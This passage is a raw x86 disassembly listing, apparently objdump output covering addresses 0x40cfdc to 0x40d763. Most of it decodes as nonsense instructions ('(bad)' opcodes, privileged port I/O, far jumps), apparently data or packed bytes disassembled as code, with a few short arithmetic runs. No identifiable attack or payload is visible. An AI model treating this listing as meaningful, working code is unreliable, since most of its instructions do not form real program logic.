  40cfdc:	mov    ebx,0xaba2f83b
  40cfe1:	dec    esp
  40cfe2:	or     ebp,DWORD PTR [edx]
  40cfe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfe5:	arpl   cx,bx
  40cfe7:	cmp    eax,0xd741267e
  40cfec:	je     0x40cffd
  40cfee:	add    dh,cl
  40cff0:	mov    al,0xfe
  40cff2:	cld    
  40cff3:	nop
  40cff4:	pop    ds
  40cff5:	jno    0x40cfb1
  40cff7:	inc    edx
  40cff8:	sbb    ah,dl
  40cffa:	mov    eax,ds:0x88554a8c
  40cfff:	jmp    0xb4fa:0x1e9265e1
  40d006:	jns    0x40cfa3
  40d008:	xchg   edx,eax
  40d009:	sub    ah,BYTE PTR [eax]
  40d00b:	into   
  40d00c:	adc    al,0xbb
  40d00e:	pop    edi
  40d00f:	add    eax,DWORD PTR [ecx+0x7bae5b52]
  40d015:	pop    edi
  40d016:	mov    es,WORD PTR [esi]
  40d018:	mov    ebx,0x5983069
  40d01d:	div    bh
  40d01f:	cdq    
  40d020:	mov    edi,0x9c60fc4b
  40d025:	xchg   ebp,eax
  40d026:	pop    edi
  40d027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d028:	(bad)  
  40d029:	sbb    BYTE PTR [eax],ah
  40d02b:	fcmovnbe st,st(5)
  40d02d:	(bad)  
  40d02e:	and    edi,DWORD PTR [edx+ebx*2+0x74]
  40d032:	(bad)  
  40d034:	or     edx,esi
  40d036:	(bad)  
  40d037:	inc    edi
  40d038:	and    eax,0x482da51
  40d03d:	mov    dl,0x4e
  40d03f:	repnz mov ebp,0x8a5a3b0c
  40d045:	mov    DWORD PTR [ebp+0x2f],ebp
  40d048:	dec    esi
  40d049:	and    eax,ebx
  40d04b:	mov    ds:0x98010df2,eax
  40d050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d051:	rcl    BYTE PTR [ecx-0x4d],0x5e
  40d055:	loop   0x40d0cf
  40d057:	icebp  
  40d058:	or     BYTE PTR [ecx-0x7e6701f4],ch
  40d05e:	mov    edi,ebp
  40d060:	ds sbb al,0x20
  40d063:	mul    BYTE PTR [edi+eiz*2+0x40]
  40d067:	dec    edx
  40d068:	adc    esi,DWORD PTR [ebp-0x6c257074]
  40d06e:	jp     0x40d0bd
  40d070:	fidiv  DWORD PTR [eax+edx*8]
  40d073:	inc    esi
  40d074:	clc    
  40d075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d076:	aam    0xe
  40d078:	ja     0x40d05b
  40d07a:	mov    WORD PTR [ebx+edi*8],?
  40d07d:	mov    ebp,0x449a457b
  40d082:	xchg   ebp,eax
  40d083:	nop
  40d084:	ins    BYTE PTR es:[edi],dx
  40d085:	and    cl,BYTE PTR [ecx+0x55]
  40d088:	inc    edx
  40d089:	sub    ebx,DWORD PTR [ebx+0x214f92ea]
  40d08f:	xor    eax,0x7aabc8d8
  40d094:	js     0x40d09c
  40d096:	mov    dl,0x8
  40d098:	dec    edx
  40d099:	dec    esi
  40d09a:	add    eax,0xbfe51ed
  40d09f:	lods   eax,DWORD PTR ds:[esi]
  40d0a0:	loopne 0x40d0e8
  40d0a2:	imul   esi
  40d0a4:	push   0xffffffb2
  40d0a6:	in     eax,0xe1
  40d0a8:	sbb    al,0xa1
  40d0aa:	jns    0x40d10e
  40d0ac:	adc    DWORD PTR [edi+eiz*4-0x2],ebp
  40d0b0:	sub    BYTE PTR [ebx+0xbbe81fe],bh
  40d0b6:	jmp    0x9761:0x7ee848c
  40d0bd:	or     esp,DWORD PTR [edx]
  40d0bf:	xor    al,0x95
  40d0c1:	push   ds
  40d0c2:	fs jbe 0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ecx,FWORD PTR [esi]
  40d0ef:	adc    DWORD PTR [esi-0x5b],ebx
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d12a
  40d0fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0fc:	xchg   ecx,eax
  40d0fd:	je     0x40d0db
  40d0ff:	mov    ?,WORD PTR [ecx-0x472b5ed0]
  40d105:	repnz mov dl,0x83
  40d108:	push   0xffffff8e
  40d10a:	or     DWORD PTR [eax],0xadbab7cf
  40d110:	fisub  DWORD PTR [esi]
  40d112:	add    DWORD PTR [edx+0xe],edi
  40d115:	(bad)  
  40d116:	cld    
  40d117:	aaa    
  40d118:	jnp    0x40d110
  40d11a:	cmp    dl,ah
  40d11c:	mov    dl,0x91
  40d11e:	sbb    DWORD PTR [esp+ebp*4-0x7a5988b6],edx
  40d125:	xchg   ebp,eax
  40d126:	out    0x80,eax
  40d128:	ds loope 0x40d104
  40d12b:	add    DWORD PTR [ecx-0x5c45b353],0x3f
  40d132:	dec    esp
  40d133:	call   0x3ecb:0x7a24b2d1
  40d13a:	nop
  40d13b:	pushf  
  40d13c:	mov    ebx,0x5d66afaf
  40d141:	cmp    eax,0x3850ca66
  40d146:	mov    ecx,0x748cfac0
  40d14b:	inc    esp
  40d14c:	icebp  
  40d14d:	std    
  40d14e:	push   ebx
  40d14f:	in     eax,0xfd
  40d151:	inc    eax
  40d152:	push   esp
  40d153:	cmp    dl,dh
  40d155:	xchg   edi,eax
  40d156:	mov    edi,0xc4f1f02c
  40d15b:	(bad)  
  40d15c:	and    eax,0xb6c25336
  40d161:	lea    edi,[edi+0x3351b073]
  40d167:	jg     0x40d13d
  40d169:	jmp    0x40d174
  40d16b:	adc    al,0x5e
  40d16d:	inc    edx
  40d16e:	fsub   QWORD PTR [ebp-0x75949a35]
  40d174:	mov    ebp,0x7f9a9cbc
  40d179:	(bad)  [esi*1+0x3ef7674c]
  40d180:	sbb    eax,0x70b0433c
  40d185:	or     al,0x5d
  40d187:	xchg   DWORD PTR [eax],esi
  40d189:	inc    esi
  40d18a:	je     0x40d193
  40d18c:	jp     0x40d11c
  40d18e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d18f:	sub    bh,bl
  40d191:	dec    ebx
  40d192:	dec    edi
  40d193:	lods   eax,DWORD PTR ds:[esi]
  40d194:	fnsave [ebp-0x70]
  40d197:	gs fwait
  40d199:	aas    
  40d19a:	ret    
  40d19b:	int3   
  40d19c:	imul   eax,DWORD PTR [ebx],0xce63aaf3
  40d1a2:	mov    ecx,0x57e4960a
  40d1a7:	adc    al,0xaa
  40d1a9:	add    edx,edx
  40d1ab:	mov    ch,0x99
  40d1ad:	push   esi
  40d1ae:	pop    ebx
  40d1af:	jl     0x40d16c
  40d1b1:	leave  
  40d1b2:	lds    ecx,FWORD PTR [ebx+0x4cf0ee13]
  40d1b8:	(bad)  
  40d1b9:	jmp    0x40d22d
  40d1bb:	daa    
  40d1bc:	mov    eax,ds:0xbb2e9513
  40d1c1:	xor    BYTE PTR [ebx+0x3b],dl
  40d1c4:	call   0xb2c4:0xbc6a309c
  40d1cb:	xchg   ebx,eax
  40d1cc:	inc    esp
  40d1cd:	test   DWORD PTR [eax-0x3775994],eax
  40d1d3:	jnp    0x40d243
  40d1d5:	push   es
  40d1d6:	and    al,0x59
  40d1d8:	sbb    BYTE PTR [edi+0x3d16313],0x6e
  40d1df:	shl    cl,cl
  40d1e1:	std    
  40d1e2:	sub    esi,DWORD PTR [edx+0x5c]
  40d1e5:	xchg   BYTE PTR [esi],bh
  40d1e7:	loop   0x40d237
  40d1e9:	or     eax,0x62065c47
  40d1ee:	sub    edi,DWORD PTR [edx]
  40d1f0:	int3   
  40d1f1:	xchg   ebp,eax
  40d1f2:	dec    edi
  40d1f3:	test   BYTE PTR [esi+0x50],bh
  40d1f6:	retf   0x2a12
  40d1f9:	xor    al,0xf5
  40d1fb:	cdq    
  40d1fc:	rcl    BYTE PTR [eax+0xc],0x56
  40d200:	repnz pop ecx
  40d202:	call   0x1ecd429d
  40d207:	jnp    0x40d189
  40d209:	cmp    esp,DWORD PTR [ebx+0x7de18ca6]
  40d20f:	xchg   ebx,eax
  40d210:	out    0x2b,al
  40d212:	push   ecx
  40d213:	leave  
  40d214:	mov    ds:0xc4ce7db2,al
  40d219:	jge    0x40d20f
  40d21b:	in     eax,0x92
  40d21d:	fdiv   QWORD PTR [ebx-0x3f5d9864]
  40d223:	push   ebp
  40d224:	fst    QWORD PTR [ecx-0xd]
  40d227:	xor    BYTE PTR [edi-0x56fd950],cl
  40d22d:	lock lods al,BYTE PTR ds:[esi]
  40d22f:	push   0xffffffd5
  40d231:	(bad)  
  40d232:	repnz dec edi
  40d234:	shr    bh,1
  40d236:	daa    
  40d237:	lds    ebx,FWORD PTR [ebx-0x53]
  40d23a:	adc    al,ch
  40d23c:	out    0x2b,eax
  40d23e:	mov    DWORD PTR [eax],edi
  40d240:	adc    al,0x9d
  40d242:	jno    0x40d1f7
  40d244:	xor    al,0xa7
  40d246:	pop    eax
  40d247:	xchg   BYTE PTR [edx+0x69c96f1a],bl
  40d24d:	push   ebp
  40d24e:	in     al,0xcf
  40d250:	pop    ebp
  40d251:	int3   
  40d252:	stos   BYTE PTR es:[edi],al
  40d253:	out    dx,al
  40d254:	jns    0x40d2a4
  40d256:	inc    eax
  40d257:	xor    DWORD PTR [edi],ebp
  40d259:	and    al,0x5b
  40d25b:	push   0x66d37dec
  40d260:	pop    esi
  40d261:	inc    esi
  40d262:	pop    ss
  40d263:	inc    eax
  40d264:	fldpi  
  40d266:	int3   
  40d267:	push   ds
  40d268:	ss sub cl,ch
  40d26b:	lahf   
  40d26c:	in     al,0x7f
  40d26e:	ror    ecx,cl
  40d270:	dec    BYTE PTR [esi+0x7e]
  40d273:	lds    edx,FWORD PTR [esi-0x8865420]
  40d279:	sti    
  40d27a:	test   al,0xde
  40d27c:	lock mov cl,0xc5
  40d27f:	mov    esp,0xd2626f41
  40d284:	mov    bh,cl
  40d286:	xchg   ebx,eax
  40d287:	add    dh,BYTE PTR [esi+0x7e9cb380]
  40d28d:	push   eax
  40d28e:	adc    BYTE PTR [esi],ah
  40d290:	out    dx,eax
  40d291:	in     eax,0x4b
  40d293:	loope  0x40d30f
  40d295:	inc    esp
  40d296:	repnz imul esp,DWORD PTR [edi*4-0x3fb55e1f],0x4a08662e
  40d2a2:	dec    esi
  40d2a3:	adc    bh,BYTE PTR [esi]
  40d2a5:	div    BYTE PTR [ebx+ebx*8]
  40d2a8:	daa    
  40d2a9:	das    
  40d2aa:	or     DWORD PTR ds:[edx-0x41087630],eax
  40d2b1:	fld    QWORD PTR [ebx-0x2b34a3df]
  40d2b7:	jno    0x40d2d3
  40d2b9:	lods   al,BYTE PTR ds:[esi]
  40d2ba:	pusha  
  40d2bb:	retf   
  40d2bc:	outs   dx,BYTE PTR ds:[esi]
  40d2bd:	fs enter 0xba16,0x3
  40d2c2:	cmp    BYTE PTR ds:0x815e6dde,ah
  40d2c8:	xor    esi,DWORD PTR [edi]
  40d2ca:	retf   0x5355
  40d2cd:	pusha  
  40d2ce:	les    edx,FWORD PTR [edx-0x17]
  40d2d1:	mov    bh,cl
  40d2d3:	cmp    eax,0x1d828be3
  40d2d8:	inc    edx
  40d2d9:	inc    edx
  40d2da:	ret    0xdda6
  40d2dd:	(bad)  
  40d2de:	in     eax,dx
  40d2df:	ja     0x40d2f0
  40d2e1:	inc    ebx
  40d2e2:	dec    eax
  40d2e3:	xlat   BYTE PTR ds:[ebx]
  40d2e4:	jo     0x40d27a
  40d2e6:	ja     0x40d2c0
  40d2e8:	mov    al,ds:0x52e9bafe
  40d2ed:	mov    ebp,0x4ca834b9
  40d2f2:	shr    BYTE PTR [ebx],0x19
  40d2f5:	fwait
  40d2f6:	dec    edx
  40d2f7:	je     0x40d28a
  40d2f9:	je     0x40d318
  40d2fb:	dec    ebp
  40d2fc:	aaa    
  40d2fd:	aaa    
  40d2fe:	push   esi
  40d2ff:	sub    BYTE PTR [esi-0x58],0x9e
  40d303:	out    dx,eax
  40d304:	cdq    
  40d305:	enter  0xefd1,0x24
  40d309:	mov    bl,0xc3
  40d30b:	or     al,0x6b
  40d30d:	inc    edx
  40d30e:	push   ebp
  40d30f:	jne    0x40d382
  40d311:	ins    DWORD PTR es:[edi],dx
  40d312:	sub    al,BYTE PTR [eax]
  40d314:	xchg   ecx,eax
  40d315:	imul   esi,DWORD PTR [edi-0x6a],0xfffffff9
  40d319:	pop    ebp
  40d31a:	cmc    
  40d31b:	stos   BYTE PTR es:[edi],al
  40d31c:	jle    0x40d2a2
  40d31e:	dec    esi
  40d31f:	jl     0x40d306
  40d321:	bound  esp,QWORD PTR [ecx+0xfd0301]
  40d327:	push   esi
  40d328:	fsub   st,st(5)
  40d32a:	adc    edi,ebx
  40d32c:	xchg   DWORD PTR [esi+0x2c],edx
  40d32f:	add    al,0xcc
  40d331:	cmc    
  40d332:	idiv   BYTE PTR [esi+ebp*8-0x4b]
  40d336:	ss xchg ecx,eax
  40d338:	call   DWORD PTR [ecx-0x6975e340]
  40d33e:	adc    bh,BYTE PTR ds:0x7946b196
  40d344:	cmp    DWORD PTR [esi-0x3f2b09ca],esp
  40d34a:	(bad)  
  40d34b:	cmp    al,0x50
  40d34d:	jne    0x40d2fa
  40d34f:	or     BYTE PTR [ebx],0x37
  40d352:	jl     0x40d3bc
  40d354:	push   cs
  40d355:	mov    WORD PTR [edi+edx*4],gs
  40d358:	add    DWORD PTR [ebx],ebp
  40d35a:	xchg   esi,eax
  40d35b:	inc    ecx
  40d35c:	mov    BYTE PTR [edi],al
  40d35e:	mov    ebx,0x64a1d15e
  40d363:	shl    dl,cl
  40d365:	rol    DWORD PTR ds:0xef9fa4e4,cl
  40d36b:	popa   
  40d36c:	or     edi,DWORD PTR [ebx]
  40d36e:	cmp    eax,0xadd230d6
  40d373:	std    
  40d374:	pop    ecx
  40d375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d376:	in     eax,0xc5
  40d378:	mov    esi,0xfd9ee9fd
  40d37d:	inc    ebp
  40d37e:	push   esi
  40d37f:	(bad)  
  40d380:	sub    BYTE PTR [ecx+ebx*4-0x1692814d],bh
  40d387:	into   
  40d388:	jbe    0x40d37e
  40d38a:	push   0xe669c7c7
  40d38f:	push   edi
  40d390:	out    dx,al
  40d391:	mov    dh,0xec
  40d393:	jns    0x40d3f1
  40d395:	fst    DWORD PTR [esi+ecx*2-0x59856da1]
  40d39c:	fs cwde 
  40d39e:	pop    eax
  40d39f:	data16 mov dl,0x27
  40d3a2:	retf   
  40d3a3:	jno    0x40d40b
  40d3a5:	mov    bh,0x65
  40d3a7:	mov    ?,WORD PTR [eax+esi*8-0x4d2eb91b]
  40d3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3af:	mov    ebx,0xe1822df5
  40d3b4:	stc    
  40d3b5:	push   0xfffffff7
  40d3b7:	shl    DWORD PTR [ebx-0x25],0x7e
  40d3bb:	push   ds
  40d3bc:	hlt    
  40d3bd:	cmp    DWORD PTR [ebx],0x385edb5
  40d3c3:	ror    DWORD PTR [esi+0x22],0x83
  40d3c7:	mov    dl,0x44
  40d3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3ca:	or     dh,BYTE PTR [edi+ecx*1]
  40d3cd:	je     0x40d3c0
  40d3cf:	js     0x40d405
  40d3d1:	push   ss
  40d3d2:	push   es
  40d3d3:	push   edx
  40d3d4:	push   esi
  40d3d5:	ss xchg ebx,eax
  40d3d7:	jo     0x40d3f0
  40d3d9:	mov    edx,0xfde34824
  40d3de:	push   edi
  40d3df:	mov    cl,0x4
  40d3e1:	(bad)  
  40d3e2:	cmp    eax,0xb3bb6ea
  40d3e7:	lea    eax,[edx]
  40d3e9:	(bad)  
  40d3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3eb:	sbb    cl,ch
  40d3ed:	mov    al,0x2f
  40d3ef:	test   BYTE PTR [esp+eax*8-0x4a8c43cd],0xce
  40d3f7:	aam    0x8e
  40d3f9:	arpl   WORD PTR [edi-0x6a71c9f1],dx
  40d3ff:	sbb    bl,BYTE PTR [ecx]
  40d401:	jmp    0x4888:0x892cb103
  40d408:	sbb    eax,0x82f8ec44
  40d40d:	pop    eax
  40d40e:	in     al,0xd6
  40d410:	scas   al,BYTE PTR es:[edi]
  40d411:	loop   0x40d42e
  40d413:	ja     0x40d47d
  40d415:	fisubr DWORD PTR [esp+eax*2]
  40d418:	mov    cl,0xb9
  40d41a:	in     al,0x27
  40d41c:	jmp    0x40d3d3
  40d41e:	adc    BYTE PTR [esi+0x21],ah
  40d421:	sbb    ah,BYTE PTR ds:0x3c606bfa
  40d427:	data16 jecxz 0x40d3c5
  40d42a:	jno    0x40d4a3
  40d42c:	pop    ecx
  40d42d:	sahf   
  40d42e:	ret    0x521c
  40d431:	mov    bh,0xc1
  40d433:	mov    al,ds:0xd291a50e
  40d438:	stos   DWORD PTR es:[edi],eax
  40d439:	shl    DWORD PTR [esi-0x11],1
  40d43c:	inc    edx
  40d43d:	inc    ecx
  40d43e:	enter  0x859d,0xfa
  40d442:	fisubr DWORD PTR [edx-0x63]
  40d445:	push   eax
  40d446:	cmp    eax,0x2d3c0df4
  40d44b:	ret    0x95cf
  40d44e:	fs pop ebp
  40d450:	fist   WORD PTR [ebx]
  40d452:	mov    esp,0xa8839399
  40d457:	mov    al,0xc2
  40d459:	jl     0x40d479
  40d45b:	mov    ecx,ebp
  40d45d:	push   0xffffffed
  40d45f:	push   cs
  40d460:	xlat   BYTE PTR ds:[ebx]
  40d461:	mov    ds:0xe7fd8d64,al
  40d466:	push   ds
  40d467:	and    DWORD PTR [edi],0xe51286d8
  40d46d:	retf   0x29c3
  40d470:	fist   WORD PTR [ebp+0x2eab909d]
  40d476:	xor    dh,al
  40d478:	sbb    al,0x37
  40d47a:	sub    BYTE PTR ds:0xd4c9bc9f,ch
  40d480:	(bad)  
  40d481:	clc    
  40d482:	jmp    0x75cd3654
  40d487:	shl    cl,1
  40d489:	int3   
  40d48a:	add    al,0x2b
  40d48c:	test   al,0xef
  40d48e:	push   0x48bee9eb
  40d493:	pop    ebp
  40d494:	cmc    
  40d495:	adc    eax,0x198e74da
  40d49a:	sub    cl,BYTE PTR [ebx-0x6b720783]
  40d4a0:	cmp    bl,BYTE PTR [edx+esi*2+0x55890032]
  40d4a7:	clc    
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x11d3:0xb81a1d63
  40d4c6:	enter  0xb84d,0xc9
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d51e
  40d4d2:	push   esp
  40d4d3:	sbb    eax,0x8febc8e6
  40d4d8:	fistp  DWORD PTR [esi+0x4a]
  40d4db:	and    dl,dh
  40d4dd:	xchg   ebp,eax
  40d4de:	in     al,0xdb
  40d4e0:	dec    esi
  40d4e1:	pop    ss
  40d4e2:	pusha  
  40d4e3:	imul   DWORD PTR [edi+esi*1-0x346f5b96]
  40d4ea:	push   ecx
  40d4eb:	jo     0x40d544
  40d4ed:	or     DWORD PTR [ecx],edx
  40d4ef:	ins    DWORD PTR es:[edi],dx
  40d4f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4f1:	cli    
  40d4f2:	xchg   DWORD PTR [edx+edx*2],ecx
  40d4f5:	push   edi
  40d4f7:	add    DWORD PTR [edi-0x5b1909f0],0x23
  40d4fe:	nop
  40d4ff:	add    eax,0x69a23321
  40d504:	test   BYTE PTR [ecx-0xe5f535d],dh
  40d50a:	jnp    0x40d511
  40d50c:	in     al,dx
  40d50d:	pushf  
  40d50e:	inc    eax
  40d50f:	cwde   
  40d510:	xchg   ebx,eax
  40d511:	stc    
  40d512:	out    0x6f,al
  40d514:	xor    ebx,ebp
  40d516:	(bad)  
  40d517:	pop    edi
  40d518:	cmp    ch,BYTE PTR [ebx+ecx*2]
  40d51b:	and    edx,edx
  40d51d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d51e:	dec    ecx
  40d51f:	pop    es
  40d520:	aam    0x9c
  40d522:	hlt    
  40d523:	shr    BYTE PTR [ebx-0x55],1
  40d526:	pop    eax
  40d527:	push   edx
  40d528:	or     ecx,DWORD PTR [ebx+eiz*1+0x49]
  40d52c:	adc    BYTE PTR [ebp-0x3aaac83a],dh
  40d532:	pushf  
  40d533:	stos   BYTE PTR es:[edi],al
  40d534:	inc    edi
  40d535:	xchg   ebp,eax
  40d536:	data16 xor dl,ch
  40d539:	ins    BYTE PTR es:[edi],dx
  40d53a:	inc    esi
  40d53b:	sub    cl,BYTE PTR [ebx]
  40d53d:	imul   eax,ebp,0x71d6d7d7
  40d543:	xor    eax,0x130c7c83
  40d548:	mov    esi,0x95acd827
  40d54d:	add    edi,DWORD PTR [edi]
  40d54f:	mov    esp,0xa574717d
  40d554:	int3   
  40d555:	sub    esp,edi
  40d557:	or     BYTE PTR [eax+0x2c],ah
  40d55a:	sub    DWORD PTR [ebx-0x25],esp
  40d55d:	mov    al,0xfe
  40d55f:	and    DWORD PTR [ebx],ebx
  40d561:	xchg   ecx,eax
  40d562:	jg     0x40d5be
  40d564:	xor    dl,BYTE PTR [ebp+0x79531692]
  40d56a:	push   esp
  40d56b:	cmc    
  40d56c:	push   cs
  40d56d:	(bad)  
  40d56e:	cmp    cl,ah
  40d570:	lahf   
  40d571:	cmp    eax,DWORD PTR [edx+0x7aaa0d60]
  40d577:	jnp    0x40d57f
  40d579:	sbb    ch,ah
  40d57b:	clc    
  40d57c:	jg     0x40d5a0
  40d57e:	mov    ds:0xd24863b2,eax
  40d583:	xor    al,0x5a
  40d585:	or     eax,0x7b220d37
  40d58a:	cmc    
  40d58b:	mov    ss,WORD PTR [edi-0x11773b23]
  40d591:	repz lds eax,FWORD PTR [ecx+0x0]
  40d595:	xchg   ebp,eax
  40d596:	stc    
  40d597:	es jbe 0x40d52d
  40d59a:	dec    ebx
  40d59b:	cwde   
  40d59c:	lea    ebx,[edi+ecx*8-0x29]
  40d5a0:	or     dl,BYTE PTR [esi+0x4f226b58]
  40d5a6:	adc    bh,bl
  40d5a8:	loop   0x40d583
  40d5aa:	and    eax,0xec77a9e3
  40d5af:	dec    ebx
  40d5b0:	js     0x40d601
  40d5b2:	out    dx,al
  40d5b3:	stos   BYTE PTR es:[edi],al
  40d5b4:	add    bl,bl
  40d5b6:	pop    ecx
  40d5b7:	loop   0x40d633
  40d5b9:	push   esp
  40d5ba:	ins    BYTE PTR es:[edi],dx
  40d5bb:	fst    QWORD PTR [edi+ebp*4-0x3bd8bfe2]
  40d5c2:	outs   dx,BYTE PTR ds:[esi]
  40d5c3:	loope  0x40d5b3
  40d5c5:	sbb    eax,0x81c3d312
  40d5ca:	ins    BYTE PTR es:[edi],dx
  40d5cb:	retf   
  40d5cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5cd:	mov    DWORD PTR [ebp-0x3744a59c],eax
  40d5d3:	sbb    ah,BYTE PTR [ebp+0x1f]
  40d5d6:	cld    
  40d5d7:	sbb    eax,0x65684eca
  40d5dc:	aas    
  40d5dd:	push   ds
  40d5de:	add    dh,BYTE PTR [ebx]
  40d5e0:	pop    ss
  40d5e1:	ss pop eax
  40d5e3:	das    
  40d5e4:	popf   
  40d5e5:	or     esi,DWORD PTR ds:0x6bf8958
  40d5eb:	pop    esp
  40d5ec:	mov    WORD PTR [esi-0x1],?
  40d5ef:	enter  0x31a,0xbb
  40d5f3:	fcmovbe st,st(1)
  40d5f5:	imul   BYTE PTR [edi+0x33]
  40d5f8:	xor    eax,0x29e12fa2
  40d5fd:	push   ebx
  40d5fe:	add    bl,ch
  40d600:	push   ss
  40d601:	scas   eax,DWORD PTR es:[edi]
  40d602:	jne    0x40d5e0
  40d604:	push   ebx
  40d605:	fisubr WORD PTR [edx]
  40d607:	mov    WORD PTR [edx-0x24],?
  40d60a:	inc    ecx
  40d60b:	push   ebp
  40d60c:	(bad)  
  40d60d:	adc    eax,DWORD PTR [ebx]
  40d60f:	int3   
  40d610:	push   cs
  40d611:	sahf   
  40d612:	sar    DWORD PTR [edi],1
  40d614:	jno    0x40d653
  40d616:	nop
  40d617:	in     al,0xd9
  40d619:	(bad)
  40d61d:	push   esp
  40d61e:	jecxz  0x40d5ad
  40d620:	loope  0x40d632
  40d622:	gs out dx,eax
  40d624:	adc    BYTE PTR [eax],bh
  40d626:	push   0xeb34cc5e
  40d62b:	aas    
  40d62c:	sbb    eax,0x7bae7b5
  40d631:	dec    eax
  40d632:	mov    eax,0xa588a199
  40d637:	fstp   QWORD PTR [ebx+eax*1+0x16bf2d2f]
  40d63e:	dec    edi
  40d63f:	ja     0x40d6bb
  40d641:	ds out dx,al
  40d643:	jge    0x40d67e
  40d645:	xchg   DWORD PTR [ecx],esi
  40d647:	aaa    
  40d648:	sbb    eax,0xdfa90f80
  40d64d:	fst    QWORD PTR [edi+0x38f6b3ed]
  40d653:	xor    eax,0x34e3cc0f
  40d658:	popf   
  40d659:	inc    esp
  40d65a:	out    dx,al
  40d65b:	out    dx,al
  40d65c:	or     DWORD PTR [ebx-0x10d416eb],0xffffffe5
  40d663:	pop    ss
  40d664:	out    dx,al
  40d665:	data16 sub BYTE PTR [edx+0x2b61f9de],dl
  40d66c:	cld    
  40d66d:	stos   DWORD PTR es:[edi],eax
  40d66e:	pop    ebp
  40d66f:	mov    ah,0xb9
  40d671:	xor    ebp,DWORD PTR [edi-0x4]
  40d674:	dec    edi
  40d675:	dec    ebp
  40d676:	mov    ebx,0x7fc98d1d
  40d67b:	icebp  
  40d67c:	and    bl,BYTE PTR [ecx+ebp*1+0x3eadd34e]
  40d683:	dec    eax
  40d684:	xchg   BYTE PTR [esi-0x6ddd73ca],dh
  40d68a:	dec    eax
  40d68b:	mov    ds:0x4b1d1456,eax
  40d690:	stc    
  40d691:	aad    0x18
  40d693:	test   esp,edx
  40d695:	sub    BYTE PTR [esi-0xc5cc5f5],bl
  40d69b:	ins    DWORD PTR es:[edi],dx
  40d69c:	imul   ebx,DWORD PTR [ecx+0xc],0x2f4a5529
  40d6a3:	push   eax
  40d6a4:	jo     0x40d627
  40d6a6:	mov    WORD PTR [ebp+0x11],fs
  40d6a9:	mov    ecx,0x5e247bf5
  40d6ae:	adc    esp,DWORD PTR [eax-0x53]
  40d6b1:	(bad)  
  40d6b3:	out    dx,eax
  40d6b4:	pushf  
  40d6b5:	test   eax,0xa1b8c9ac
  40d6ba:	and    eax,edx
  40d6bc:	js     0x40d6b0
  40d6be:	loop   0x40d6fd
  40d6c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6c1:	mov    eax,ds:0x2f7be2c0
  40d6c6:	cmovp  esp,DWORD PTR ds:0xc55a2984
  40d6cd:	push   edx
  40d6ce:	push   ebp
  40d6cf:	mov    ebx,0xa85c8963
  40d6d4:	bnd jge 0x40d715
  40d6d7:	mov    eax,ds:0x2cb07ae2
  40d6dc:	add    BYTE PTR [edx],ch
  40d6de:	xchg   ecx,eax
  40d6df:	sub    al,0xfb
  40d6e1:	dec    eax
  40d6e2:	add    eax,0x301a4b5d
  40d6e7:	shl    DWORD PTR ds:0x691cf94f,cl
  40d6ed:	sub    DWORD PTR [ebx+0x4eb927bd],edi
  40d6f3:	into   
  40d6f4:	sbb    eax,0xb935dbfa
  40d6f9:	fisubr DWORD PTR [eax+0x1a554517]
  40d6ff:	xchg   ecx,eax
  40d700:	ret    0xcde5
  40d703:	or     BYTE PTR [ebp+0x661cb796],bl
  40d709:	ds push edx
  40d70b:	popa   
  40d70c:	dec    ecx
  40d70d:	and    BYTE PTR [ecx-0x41b1ae10],ah
  40d713:	and    al,bh
  40d715:	neg    BYTE PTR ds:0x61b02da9
  40d71b:	bound  ebx,QWORD PTR [eax+0x722d9c85]
  40d721:	or     eax,0xd08750e5
  40d726:	mov    ds:0x6e976548,eax
  40d72b:	sub    DWORD PTR ds:0x15162d91,edx
  40d731:	sub    eax,0xfaa69ca7
  40d736:	scas   eax,DWORD PTR es:[edi]
  40d737:	ins    BYTE PTR es:[edi],dx
  40d738:	sbb    dl,bh
  40d73a:	jb     0x40d6cb
  40d73c:	cmc    
  40d73d:	mov    DWORD PTR [esi-0x6a],0xe1fa70df
  40d744:	imul   esp,DWORD PTR [esi],0x4c65c64c
  40d74a:	ins    DWORD PTR es:[edi],dx
  40d74b:	rol    ebp,cl
  40d74d:	lds    ebx,FWORD PTR [ecx+eax*2+0x40]
  40d751:	es and eax,0x2d0cf7c4
  40d757:	sub    al,0xe8
  40d759:	jb     0x40d768
  40d75b:	mov    eax,ds:0x77c138c5
  40d760:	(bad)  
  40d761:	int    0xec
  40d763:	jecxz  0x40d79d
